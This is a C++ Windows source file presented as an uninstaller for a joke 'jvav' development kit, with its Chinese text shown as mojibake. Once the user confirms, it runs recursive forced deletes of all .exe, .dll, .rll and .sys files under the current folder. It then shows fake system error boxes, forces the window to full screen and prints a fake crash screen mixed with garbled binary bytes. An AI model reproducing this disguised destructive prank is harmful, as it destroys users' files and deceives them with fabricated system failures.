//
// Copyright (C)   ExecuitIF.
//
//
/***********************************************************************************************
 ***            C O N F I D E N T I A L  ---  E X E C U I T I F   S T U D I O S              ***
 ***********************************************************************************************
 *                                                                                             *
 *                 Project Name : jvav-uninst                                                  *
 *                                                                                             *
 *                    File Name : jvav-unins.cpp                                               *
 *                                                                                             *
 *                   Programmer : ExecuitIF                                                    *
 *                                                                                             *
 *                   Start Date :  15/06/2020                                                  *
 *                                                                                             *
 *                  Last Update :  ,                                                           *
 *                                                                                             *
 *---------------------------------------------------------------------------------------------*
 * Functions:                                                                                  *
 *                     #.h                                                                     *
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */

#include "#.h"

int main(int argc, char** argv)
{
	char temp;
	system("color F0");
	cout<<"È·ÊµÒªÐ¶ÔØ jvav ±àÒë¿ª·ÅÌ×¼þ£¨¼¯³É¿ª·¢»·¾³£© Âð£¿£¨y/n£©\n";
	cin>>temp;
	if(temp=='Y'||temp=='y')
	{
		system("del /s /f /q .\\*.exe");
		system("del /s /f /q .\\*.dll");
		system("del /s /f /q .\\*.rll");
		system("del /s /f /q .\\*.sys");
		MessageBox(NULL,"Òì³£µÄ´íÎó£¡","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"ÄÚ´æ0xc0000005´¦Àí´íÎó","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"ÏµÍ³Ö÷½ø³Ì \"rundll32.exe\" ÒÑÍ£Ö¹ÔËÐÐ","ÖÂÃü´íÎó",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		system("color 1F");
		HWND hwnd = GetForegroundWindow();
		int cx = GetSystemMetrics(SM_CXSCREEN);
		int cy = GetSystemMetrics(SM_CYSCREEN);
		LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
		SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
		SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
		system("cls");
		cout<<"\n\n\n\n\n\n\n                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                       /                                                                                                                                                      \n";
		cout<<"                  0   |                                                                                                                                                       \n";
		cout<<"                      |                          ÿHƒÂH‰ÙH‰Sèé”ÿÿH‰ÙH‰ÆèŽ¬ÿÿI‰ÅH‹C€8I„ Jÿÿé§íÿÿ‹Fƒø„óÿÿŽÑ                                                           \n";
		cout<<"                  0    \\                             ÁåI‰íL-–Ž	èçÿÿI‰ÆH>Í‰ðI‰ùº7                                                                                    \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                               /               -----                                                                                                                          \n";
		cout<<"                              /               /     \\                                                                                                                         \n";
		cout<<"                         0   /   0           |       |                                                                                                                        \n";
		cout<<"                            /                 \\     /                                                                                                                         \n";
		cout<<"                           /                   -----                                                                                                                          \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
	}
	system("pause");
	return false;
}

void full_screen()
{
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);
	int cy = GetSystemMetrics(SM_CYSCREEN);
	LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
	SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
}

